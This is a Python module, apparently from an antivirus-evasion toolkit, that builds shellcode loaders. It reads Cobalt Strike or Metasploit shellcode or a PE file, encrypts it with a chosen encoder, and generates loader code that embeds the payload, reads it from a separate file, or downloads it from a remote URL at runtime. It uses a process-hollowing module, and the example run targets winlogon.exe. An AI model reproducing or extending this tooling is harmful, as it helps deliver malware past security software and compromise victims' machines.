import importlib

#1.buf=shellcode，这里的shellcode就是最终运行需要的shellcode
import json
import os
import re
import shutil
from shellcodeLoader import ProcessHollowingSave

buf=''




def main(enc=False,mode='',payloadFile='',url='',otherdic=dict(),onlybuf=False):
    global buf

    if payloadFile:
        buf=readPayload(payloadFile,otherdic)

    if not buf:
        return ''

    if onlybuf:
        return buf

    #1.确保buf是unicode，此处是为了兼容CS和MSF
    if isinstance(buf,str):
        buf=buf.encode('latin1')

    #2.此处使用了指定的加解密器中的Encode方法来加密shellcode
    data=''
    key=''
    if enc:
        md=importlib.import_module(f'Encoder.{enc}'.replace('.py',''))
        buf=md.Encode(buf)
        key=md.key

    #3如果启用了本地或远程文件分离，将加密后的shellcode写入PayloadFile
    if mode:
        WriteShellcode(buf)

    #3.如果使用文件分离，那么久返回对应的函数，如果不使用文件分离，则直接返回shellcode
    if not mode:
        buf=f'buf={buf}'
    elif mode=='local':
        buf=fileMode()
    elif mode=='network':
        buf=networkMode(url)

    # print(f'原始shellcoder：\n{buf}\n'+'-'*80)
    return buf


def WriteShellcode(buf):
    file=os.path.dirname(os.path.abspath(__file__))+os.sep+'result'+os.sep+'PayloadFile'
    try:
        os.makedirs(os.path.dirname(file))
    except:
        pass
    with open(file,'wb') as f:
        f.write(buf)


def ReadShellcode():
    global buf
    file=os.path.dirname(os.path.abspath(__file__))+os.sep+'result'+os.sep+'PayloadFile'
    try:
        os.makedirs(os.path.dirname(file))
    except:
        pass
    with open(file,'rb') as f:
        buf2=f.read()

    if not buf2:
        buf=buf2
    return buf2


def fileMode():
    buf=f"""
with open('PayloadFile','r') as f:
    buf=f.read().encode('latin1')
    """
    return buf


def networkMode(url=''):
    import requests
    if url:
        r=requests.get(url)
        if r.status_code==200:
            buf=r.content.decode('latin1').encode('latin1')

        buf=f"""import requests
r=requests.get('{url}')
if r.status_code==200:
    buf=r.content.decode().encode('latin1')"""

    else:
        buf=f"""import requests
r=requests.get(url)
if r.status_code==200:
    buf=r.content.decode().encode('latin1')"""

    return buf


def readPayload(payloadFile,otherdic=dict()):

    buf=''
    if re.search('\.py',payloadFile):
        #py文件，将其拷贝到temp目录

        targetFile=os.path.dirname(os.path.abspath(__file__))+os.sep+f'temp{os.sep+os.path.basename(payloadFile)}'
        try:
            os.makedirs(os.path.dirname(targetFile))
        except:
            pass
        shutil.copy(payloadFile,targetFile)
        #直接动态import
        targetFile=f'temp.{os.path.basename(payloadFile)}'.replace('.py','')

        md=importlib.import_module(targetFile)
        buf=md.buf

    elif re.search('\.exe',payloadFile):
        #exe文件，读取PE信息
        buf=ProcessHollowingSave.getPayload(payloadFile)

        if isinstance(otherdic,dict):
            buf.update(otherdic)
        buf=json.dumps(buf)

    else:
        print('pass')

    return buf
if __name__ == '__main__':

    a=main('base64Enc','network',r"D:\BaiduSyncdisk\dyb\a_penetration\kali_tools\my_project\project\BypassAV\风暴免杀\config\artifact.exe",'',{'TARGET_EXE':'winlogon.exe'})
    print(a)

